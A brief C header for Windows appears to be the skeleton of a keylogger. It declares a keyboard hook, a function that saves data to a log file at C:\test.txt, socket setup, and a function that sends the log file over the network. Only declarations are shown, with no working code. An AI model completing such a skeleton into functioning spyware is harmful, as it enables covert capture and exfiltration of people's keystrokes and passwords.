#pragma once
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <io.h>
#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32.lib")
#define BUFFSIZE 1024
# define LOGFILE		"C:\\test.txt"
struct keyboard
{
	DWORD code;
	char *character;
};

void	setwinhook();
void	save_data(const char*);
SOCKET	init_socket(SOCKET);
void	send_data(SOCKET, FILE*);
